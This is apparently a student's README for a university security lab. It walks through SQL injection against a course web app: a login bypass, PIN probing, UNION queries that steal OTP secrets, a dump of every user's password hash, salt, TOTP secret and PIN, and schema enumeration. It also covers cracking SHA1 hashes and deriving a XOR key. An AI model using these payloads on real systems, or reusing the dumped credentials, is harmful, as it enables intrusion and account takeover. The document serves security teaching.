# ctu-kbe-lab3

Uses Javascript (NodeJs) to solve tasks 5 and 9.
All tasks and conclusions below.

## Install & Execute

To install:
1) Install NodeJs **v14+**
2) Run the following:
```bash
> npm install
```

To run the tests:
```bash
> npm test
```

## Task 1: Login without password
   Simply comment out the rest of the query. Add comment mark # after username in the username section, this will mask out the password requirement.
  
  - username: `hulamart';#`
  - password: `<any string>`

  Resulting SQL query: 
  ```sql
  SELECT username FROM users WHERE username = 'hulamart';#' AND password = SHA1('<any string>' . '$salt')
  ```

## Task 2: Find out your PIN
  Extending the previous query and adding a requirement on correct PIN, we can find each correct pin digit in <=9 tries. 
  
  Iteration 1:
  - username: `hulamart' AND pin LIKE '____';#`
  - password: `<any string>`
```sql
  SELECT username FROM users WHERE username = 'hulamart' AND pin LIKE '____';#' AND password = SHA1('<any string>' . '$salt')
  ```
  Trying ```LIKE '0___'```, ```LIKE '1___'```, ```LIKE '2___'```. If it's possible to login, the digit is correct.
  
  Possible to login for ```LIKE '6___'```.

  Iteration 2:
  - username: `hulamart' AND pin LIKE '6___';#`
  - password: `<any string>`

  Possible to login for ```LIKE '66__'```.

  Iteration 3:
  - username: `hulamart' AND pin LIKE '66__';#`
  - password: `<any string>`

  Possible to login for ```LIKE '669_'```.

  Iteration 4:
  - username: `hulamart' AND pin LIKE '669_';#`
  - password: `<any string>`

  Possible to login for ```LIKE '6692'```.

  **PIN is 6692.**

## Task 3: Overcome One-Time-Password
  The goal here is to modify the return value of above query so that it returns the `secret` value instead of the username. This value will then be displayed in the PIN page.

  - username: `idontexist' UNION SELECT secret as username FROM users WHERE username = 'hulamart';#`
  - password: `<any string>`

```sql
  SELECT username FROM users WHERE username = 'idontexist' 
  UNION SELECT secret as username FROM users WHERE username = 'hulamart';#' AND password = SHA1('<any string>' . '$salt')
  ```
  Safely assuming that user *idontexist* does not exist, the only returned value will be the secret and it will be displayed in the PIN page.

  Registering Google Authenticator with this secret value will allow us to use it to generate one-time passwords.

## Task 4: Exfiltrate a list of all usernames, passwords, salts, secrets and pins
  For this task we'll use a vulnerability to SQL Injection in the GET parameter *offset* in the URL.

  Url with offset looks as follows:
  ```
  https://kbe.felk.cvut.cz/index.php?offset=2
  ```
  Let's replace the offset directly in the URL:
  ```
  https://kbe.felk.cvut.cz/index.php?offset=0 UNION SELECT CONCAT(username, ';', password, ';', salt, ';', secret, ';' ,pin) as date_time, 1 FROM users
  ```

  This will result in query:
```sql
  SELECT date_time, base64_message_xor_key AS message FROM messages  WHERE username = '$_SESSION[username]' LIMIT 1 OFFSET 0 
  UNION SELECT CONCAT(username, ';', password, ';', salt, ';', secret, ';', pin) as date_time, 1 FROM users
  ```
  
  This will print all username, password, salt, secret and pin values separated by a semi-colon just below the original message in messages.

  The data is as follows:
  ```
username, ';', password, ';',salt, ';',secret, ';',pin
komartom;2d55131b6752f066ee2cc57ba8bf781b4376be85;kckct;JD5WXOFDCB7CVMMF;6607
dzivjmat;62814f10dd416b616f733605740304cd87ba7508;ac598;3XLU4LMYWYYNFFW4;4425
horovtom;8b3a52b2cfdbda9fd2417b3b10ccc7e02c8a4d8e;f9ca1;KABBE4IS4GQYD4AJ;9907
hulamart;026f5211efb57728d3491b795d560ee7504a1de8;5651a;OSRPNLI3QB44BCHD;6692
jarkoma3;a3c355724882ab6c8aebed5711a36b26630010e6;db116;EY52GXJQICFOWSAY;5768
kacenjir;ff6b008980f05029be1a1b125ca62338c8721aca;e463d;PBA26N4K2UNVEF5A;9815
koubadom;7c464e41d5418f13b17bf7b98851b408dcbda7f0;6c405;TWF3PGZ74YFEJGXD;0170
kovacj11;26f904edbb83aaae75c42abe906631bd1535aabe;f9718;PZPSNTWL6HG4WPRE;5426
lupennik;06581f57702232b0aeda224bd31da52d74b4a8d1;54b94;L4QNDNOAC425AAV4;9597
matijmic;2655a13f039e9966d590ca8e260cc1a48bf494a6;1e09d;27XSBYWHUONPWDFD;8676
mullevik;d54729441577b071d4762fe4b1d5b837c086800e;06c5e;APQTQMJCNQLMPLGY;1846
mulleste;177996c78b67a7819aa6c519499843f0e7fc63cf;978ad;SWONH2FQJ6IKXBS6;3819
scupamic;97be8007947043126055c9203213d898a82c6cca;aa7a6;P3CRVVKDTH44GZV7;7780
sinelser;c524fc7812a556118414e12fc6be9b5ed022cd4f;c6290;AWQJITSIA5MZXDBK;3043
sojmadmi;940b8bb7d2fcca4dcbb4cef4246016cf691b4cd2;7f454;PZXDARUBQUEM2BDF;9224
stejspe7;dd017b8f3bdb9fce4cad84dc87269b12954a1114;28af9;FKEXAA5UF44PDUQZ;4650
subikste;64bc1ceb141e8963d3b934e4f68995446e561c22;af8e1;GVM2WZOOHLOOV4TP;4653
trnkavla;705529ad29a462e611682176e4c889ba1a392a99;e1f69;VXCN2SPHM4YPS7CI;4750
vankope6;043e058894d0e34d13767d0d976dc1d34766368c;7e284;UNOFIJ3EDBIUNILS;2186
```

## Task 5: Crack your password hash
  The point of this task was to create a script that would use brute-force approach to decode the hashed password. From the previous task I was able to get password and salt:

  - hashed password: `026f5211efb57728d3491b795d560ee7504a1de8`
  - salt: `5651a`

  We know that the lenght of password is 5 characters and the password is limited to a combination of lowercase letters and numbers. This restricts the space of input values and we can get the result very fast (~1s).

  Simple algorithm:
  1. Recursively generate combinations of input values of given length (5 characters)
  2. For each combination
      1. create sha1 hash of the value concatenated with salt - `sha1(combination+salt)`  
      2. if the hash equals our hashed password - break the search and return the combination
  
  *(For performance - 2. is done whenever new value is generated.*)

  **task5.js**
    - `crackSha1Hash(hashed, salt)` method takes hashed value and a known salt, uses bruteforce to find plaintext value (5 characters)
  **task5.test.js**
    - runs `crackSha1Hash` method with this task's parameters to find out the plaintext password

  - plaintext password: `a0e9d`

## Task 6: Crack teacher's password hash
  The goal here is to find teacher's password in plaintext but NOT using the brute-force approach from the previous exercise. From Task 4 we get the values of hashed password of user *komartom*:
  
  - hashed password: `2d55131b6752f066ee2cc57ba8bf781b4376be85`
  - salt: `kckct`

  Using internet to crack this password we can go (for example) to https://crackstation.net/. Inputting the hashed password we instantly get the plaintext value:
  
  - plaintext: `fm9fytmf7qkckct`

  Subtracting the salt we get the plaintext password:

  - plaintext password: `fm9fytmf7q`


  **task5.test.js**
    - runs `hash` method to test the validity of above-mentioned plaintext password
  
## Task 7: Explain why teacher's password is insecure despite it's length
  The password is insecure because it can be found using tables with pre-calculated values of plaintexts and their hashes (rainbow tables). Cracking such hash is simply a lookup in this table. 
  In this example, the salt value is short. Using longer values for salt should help prevent such precomputation attacks.

## Task 8: Print a list of all table names and their columns
  Using the same technique as in Task 4, we can print values of other tables simply using the UNION operator along with CONCAT. In this case we need to query tables of INFORMATION_SCHEMA *(INFORMATION_SCHEMA.TABLES, INFORMATION_SCHEMA.COLUMNS)*

  Firstly, let's query the tables.

  Again, let's replace the offset directly in the URL:
  ```
  https://kbe.felk.cvut.cz/index.php?offset=0 
   UNION SELECT CONCAT(TABLE_NAME, ';', TABLE_ROWS) as datetime, 1 FROM INFORMATION_SCHEMA.TABLES
  ```

  This will result in query:
```sql
  SELECT date_time, base64_message_xor_key AS message FROM messages WHERE username = '$_SESSION[username]' LIMIT 1 OFFSET 0 
   UNION SELECT CONCAT(TABLE_NAME, ';', TABLE_ROWS) as datetime, 1 FROM INFORMATION_SCHEMA.TABLES
  ```
  
  This will print all tables and number of records in each table (optional) separated by a semi-colon just below the original message in messages.

  ```
  codes;20
  messages;57
  users;19 
  ```

  Now we can query for columns of each of the tables. We create and execute three queries, one for each table:
  
  **Codes**
  ```
  https://kbe.felk.cvut.cz/index.php?offset=0 
  UNION SELECT Column_name as datetime, 1 FROM INFORMATION_SCHEMA.COLUMNS where table_name like 'codes'
  ```

  This prints columns of 'codes' table:
  ```
  username
  aes_encrypt_code
  ```

  **Messages**
  ```
  https://kbe.felk.cvut.cz/index.php?offset=0 
  UNION SELECT Column_name as datetime, 1 FROM INFORMATION_SCHEMA.COLUMNS where table_name like 'messages'
  ```

  This prints columns of 'messages' table:
  ```
  username
  base64_message_xor_key
  date_time
  ```

  **Users**
  ```
  https://kbe.felk.cvut.cz/index.php?offset=0 
  UNION SELECT Column_name as datetime, 1 FROM INFORMATION_SCHEMA.COLUMNS where table_name like 'users'
  ```

  This prints columns of 'users' table:
  ```
  username
  password
  pin
  secret
  salt
  ```

## Task 9: Derive xor key used for encoding your messages
  For this task, first we need to get the encrypted messages. Again, we modify the URL offset and run a custom query, to get all the encrypted messages in Base64:

  ```
  https://kbe.felk.cvut.cz/index.php?offset=0 
  UNION SELECT base64_message_xor_key as datetime, 1 FROM messages where username='hulamart'
  ```

  Which results in these encrypted messages:
  ```
  LwoePAQIHH8PUQlZKgcDCD5ARA4fGlFefx8NECwTWkQRJgQXF39UWUBDDE8BOggXHCsTXlJCLAoFAHE=

  RA5SNxkAH2IUWllVOhNMFTdCD1FfHApVYSMACzoPHFYPfxINEH9RUVwQHgYcO0scFipBE0RUPB4QAH9RX1ZVVg==

  LwoeM0dFDTdSRxBCfwoOCX9UX0AQFgAFcUs2DT5KE0NEMQ4GRTldQhJEEApSMQ4dDX9QW1ZdMw4MAjpBHg==
  ```

  For the plaintexts, we can find these directly in the website. We simply inspect the HTML of each message, one message per page. Assuming each message directly contains the html tags, we get the messages:
  ```
  Welcome <b>hulamart</b>, this is your first secret message.

  <a href="index.php?code">Here</a> you can find your secure code.

  Well, that's all for now. Stay tuned for the next challenges.
  ```

  We know that the cipher being used is a XOR cipher.
  For plaintext A and cipher key K we get the ciphertext C as follows:
  A ⊕ K = C
  
  In this task the goal is to find K. 
  
  Using the axiom of commutativity we modify the above eqation: 
  A ⊕ K = C => K ⊕ A = C

  As per [wikipedia](https://en.wikipedia.org/wiki/XOR_cipher):
  (B ⊕ A) ⊕ A = B
  
  Reworded:
  (C ⊕ A) ⊕ A = C

  Substitute:
  K = C ⊕ A
  =>
  (C ⊕ A) ⊕ A = C
  K ⊕ A = C

  Which corresponds to our equation above.

  Thus **K = C ⊕ A**

  Using this simple XOR in code, we can calculate K<sub>1</sub>, K<sub>2</sub> and K<sub>3</sub>.

  **task9.js**
  - `getXorKey (plaintext, base64hashed)` method takes the plaintext value its hash in base64, it performs XOR on each byte returns HEX key
  
  **task9.test.js**
  - runs `getXorKey` method with each of the plaintext/ciphertext combinations in order to calculate the keys

Keys
  - K<sub>1</sub>
  786f725f6b65795f333337315f6b62655f32303230786f725f6b65795f333337315f6b62655f32303230786f725f6b65795f333337315f6b62655f
  - K<sub>2</sub>
  786f725f6b65795f363337315f6b62655f32303230786f775f6b65795f333337315f6b62655f32303230786f725f6b65795f333337315f6b62655f3230323078
  - K<sub>3</sub>
  786f725f6b65795f333337315f6b62655f32303230786f725f6b65795f333337315f6b62655f32303230786f725f6b65795f333337315f6b62655f3230

  There is some small inconcistency between these which may be due difference in length of the strings or due to different encoding of some special characters. Nevertheless, it is easy to observe a pattern:

  Cyclic key `786f725f6b65795f333337315f6b62655f32303230` seems to be used.
